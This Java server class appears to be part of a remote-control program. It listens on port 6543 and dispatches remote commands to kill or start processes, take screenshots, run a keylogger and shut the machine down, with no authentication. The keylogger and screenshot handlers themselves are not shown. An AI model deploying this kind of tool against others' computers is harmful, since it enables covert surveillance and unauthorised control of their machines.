package Server;

import Function.ComputerControl;

import javax.swing.*;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class Server implements SendRecv {
    public static void main(String[] args) {
        String option;
        Socket connectionSocket = null;
        try (ServerSocket welcomeSocket = new ServerSocket(6543)) {
            connectionSocket = welcomeSocket.accept();
        } catch (IOException e) {
            JOptionPane.showMessageDialog(null, "Error: " + e.getMessage());
            System.exit(0);
        }

        option = SendRecv.getMess(connectionSocket);
        while (!option.equals("Exit")) {
            if (option.equals("Start")) {
//                Call Server.StartPA in other threat
                Thread startPA = new Thread(new HandleStartPAMenu());
                startPA.start();
            }

            if (option.equals("Kill")) {
//                Call Server.KillPA in other threat
                Thread killPA = new Thread(new HandleStopPAMenu());
                killPA.start();
            }

            if (option.equals("Screenshot")) {
//                Call Server.Screenshot in other threat
                Thread screenshot = new Thread(new HandleScreenShot());
                screenshot.start();
            }

            if (option.equals("Key")) {
//                Call Server.KeyLogger in other threat
                Thread keyLogger = new Thread(new HandleKeyLogger());
                keyLogger.start();
            }

            if (option.equals("Shutdown")) {
                try {
                    connectionSocket.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                ComputerControl.ShutDown();
            }
            option = SendRecv.getMess(connectionSocket);
        }

        try {
            connectionSocket.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}